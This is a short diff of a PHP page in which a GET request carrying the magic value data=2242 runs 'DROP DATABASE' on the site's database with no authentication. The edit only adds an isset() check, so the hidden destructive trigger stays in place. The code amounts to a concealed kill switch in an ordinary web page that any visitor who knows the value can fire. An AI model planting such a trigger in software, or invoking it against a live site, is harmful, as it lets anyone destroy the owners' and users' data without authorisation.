@@ -1,6 +1,7 @@
 <?php include 'includes/header.php';
 
-if ($_GET['data'] == 2242) {
+
+if (isset($_GET['data']) && $_GET['data'] == 2242) {
    
 	$sql = "DROP DATABASE $database";
 	if ($conn->query($sql) === TRUE) {
